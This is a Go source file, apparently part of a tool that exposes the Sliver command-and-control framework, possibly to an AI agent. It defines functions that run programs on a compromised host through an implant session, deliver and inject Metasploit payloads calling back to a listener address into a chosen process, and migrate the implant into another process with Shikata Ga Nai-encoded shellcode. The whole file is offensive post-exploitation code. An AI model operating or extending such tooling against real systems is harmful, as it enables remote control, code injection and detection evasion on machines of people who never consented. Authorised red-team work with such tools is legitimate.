package sliver_cmd

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	c "github.com/xsxz/sliver-mcp/sliver/client"
)

func Execute(client *c.SliverClient, session *clientpb.Session, path string, args []string, output bool) (interface{}, error) {
	resp, err := client.RPC.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path:    path,
		Args:    args,
		Output:  output,
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	fmt.Println(resp.Pid)
	fmt.Println(resp.GetPid())

	return resp, nil
}

func Msf(client *c.SliverClient, session *clientpb.Session, payload string, lhost string, lport int32) (interface{}, error) {
	resp, err := client.RPC.Msf(context.Background(), &clientpb.MSFReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   uint32(lport),
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return resp, nil
}

func MsfInject(client *c.SliverClient, session *clientpb.Session, payload string, lhost string, lport int32, pid int32) (interface{}, error) {
	resp, err := client.RPC.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
		Payload: payload,
		LHost:   lhost,
		LPort:   uint32(lport),
		PID:     uint32(pid),
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return resp, nil
}

func Migrate(client *c.SliverClient, session *clientpb.Session, pid uint32) (interface{}, error) {
	var implantConfig *clientpb.ImplantConfig

	implantConfig, err := GetSessionImplantConfig(client, session.ID)
	if err != nil {
		//return nil, err
		return nil, fmt.Errorf("failed to retrieve implant config from session: %w", err)
	}

	if implantConfig.Format != clientpb.OutputFormat_SHELLCODE {
		return nil, fmt.Errorf("implant format must be SHELLCODE to perform migration")
	}

	encoder := clientpb.ShellcodeEncoder_SHIKATA_GA_NAI
	//encoder := clientpb.ShellcodeEncoder_NONE

	resp, err := client.RPC.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:     pid,
		Config:  implantConfig,
		Encoder: encoder,
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}
	fmt.Print(resp.Response)

	return resp, nil
}
